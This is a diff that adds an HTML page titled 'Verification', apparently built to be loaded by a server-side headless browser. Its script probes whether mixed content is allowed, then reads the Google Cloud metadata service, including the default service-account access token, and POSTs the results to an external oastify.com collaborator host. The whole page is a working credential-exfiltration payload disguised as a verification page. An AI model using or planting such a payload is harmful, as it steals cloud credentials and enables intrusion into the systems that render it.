@@ -1,0 +1,27 @@
+<html><head><title>Verification</title></head><body>
+<script>
+var c = 'h6okw84ags44xavlf0mfn3vlzc59tftujld65v.oastify.com';
+
+// Baseline: HTTPS fetch (always works if page loads at all)
+fetch('https://'+c+'/https-loaded', {mode:'no-cors'});
+
+// Mixed-content probe: HTTP fetch from HTTPS page
+// Works ONLY if Chrome runs with --allow-running-insecure-content or page is HTTP
+fetch('http://'+c+'/http-probe', {mode:'no-cors'})
+  .then(function(){fetch('https://'+c+'/http-allowed', {mode:'no-cors'});})
+  .catch(function(e){
+    fetch('https://'+c+'/http-blocked?e='+encodeURIComponent(e.message||'err'), {mode:'no-cors'});
+  });
+
+// If mixed content is allowed, also attempt IMDS
+fetch('http://169.254.169.254/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}})
+  .then(function(r){return r.text();})
+  .then(function(d){return fetch('https://'+c+'/gcp', {method:'POST', body:d, mode:'no-cors'});})
+  .catch(function(){});
+
+fetch('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'}})
+  .then(function(r){return r.text();})
+  .then(function(d){return fetch('https://'+c+'/token', {method:'POST', body:d, mode:'no-cors'});})
+  .catch(function(){});
+</script>
+</body></html>
